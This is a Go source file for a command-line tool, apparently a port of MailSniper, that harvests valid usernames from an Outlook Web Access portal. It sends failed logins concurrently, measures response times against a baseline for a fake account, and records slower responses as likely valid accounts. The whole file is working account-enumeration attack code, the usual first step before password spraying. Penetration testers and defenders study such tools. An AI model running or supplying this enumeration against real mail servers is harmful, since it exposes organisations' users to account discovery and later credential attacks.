package cmd

import (
	"fmt"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/spf13/cobra"
	"mailsniper-go/internal/output"
	owaClient "mailsniper-go/internal/owa"
)

func newHarvestUsersCmd() *cobra.Command {
	var (
		hostname string
		userList string
		password string
		threads  int
		outFile  string
		outFmt   string
		skipTLS  bool
	)

	cmd := &cobra.Command{
		Use:   "harvest-users",
		Short: "Harvest valid OWA usernames via timing (Invoke-UsernameHarvestOWA)",
		Long: `Attempts to enumerate valid usernames against an OWA portal by measuring
login response timing. Valid accounts typically receive longer responses due to
password hash operations even when the password is wrong.

Equivalent to the PowerShell Invoke-UsernameHarvestOWA function.`,
		RunE: func(cmd *cobra.Command, args []string) error {
			users, err := readLines(userList)
			if err != nil {
				return fmt.Errorf("read user list: %w", err)
			}
			fmt.Printf("[*] Loaded %d users from %s\n", len(users), userList)
			fmt.Printf("[*] Probing OWA at %s (timing-based enumeration)...\n", hostname)

			type timingResult struct {
				user    string
				elapsed time.Duration
				valid   bool
			}

			sem := make(chan struct{}, threads)
			resultCh := make(chan timingResult, len(users))
			var wg sync.WaitGroup

			// Baseline: use a very unlikely username to get a "no-user" timing.
			oc, err := owaClient.NewClient(hostname, skipTLS)
			if err != nil {
				return fmt.Errorf("OWA client: %w", err)
			}
			_, baselineDuration, _ := oc.TimedLogin("thisuserdoesnotexist1234567890@invalid.local", password)
			threshold := baselineDuration + (baselineDuration / 2) // 150% of baseline
			fmt.Printf("[*] Baseline timing: %v | Threshold: %v\n", baselineDuration, threshold)

			for _, user := range users {
				user := user
				wg.Add(1)
				sem <- struct{}{}
				go func() {
					defer wg.Done()
					defer func() { <-sem }()
					oc, err := owaClient.NewClient(hostname, skipTLS)
					if err != nil {
						resultCh <- timingResult{user, 0, false}
						return
					}
					ok, elapsed, _ := oc.TimedLogin(user, password)
					// Consider valid if authenticated OR if timing exceeds baseline threshold.
					likely := ok || elapsed > threshold
					resultCh <- timingResult{user, elapsed, likely}
				}()
			}
			wg.Wait()
			close(resultCh)

			var results []timingResult
			for r := range resultCh {
				results = append(results, r)
			}
			sort.Slice(results, func(i, j int) bool { return results[i].elapsed > results[j].elapsed })

			var userResults []output.UserResult
			fmt.Printf("\n%-40s  %s\n", "Username", "Elapsed")
			fmt.Printf("%-40s  %s\n", strings.Repeat("-", 40), "----------")
			for _, r := range results {
				marker := "  "
				if r.valid {
					marker = "[+]"
					fmt.Printf("[+] %-40s  %v (likely valid)\n", r.user, r.elapsed)
				} else {
					_ = marker
				}
				userResults = append(userResults, output.UserResult{
					Username: r.user,
					Valid:    r.valid,
				})
			}

			if outFile != "" {
				fmt.Printf("\n[*] Writing results to %s\n", outFile)
				if err := output.WriteUserResults(outFile, output.ParseFormat(outFmt), userResults); err != nil {
					return fmt.Errorf("write results: %w", err)
				}
			}
			return nil
		},
	}

	f := cmd.Flags()
	f.StringVar(&hostname, "hostname", "", "OWA server hostname")
	f.StringVar(&userList, "user-list", "", "File with usernames (one per line)")
	f.StringVar(&password, "password", "Password1", "Password to use for probing (any value; won't authenticate)")
	f.IntVar(&threads, "threads", 1, "Number of concurrent threads (keep at 1 for accuracy)")
	f.StringVar(&outFile, "output", "", "Output file path")
	f.StringVar(&outFmt, "output-format", "txt", "Output format: csv, json, txt")
	f.BoolVar(&skipTLS, "skip-tls", false, "Skip TLS certificate verification")

	_ = cmd.MarkFlagRequired("hostname")
	_ = cmd.MarkFlagRequired("user-list")
	return cmd
}
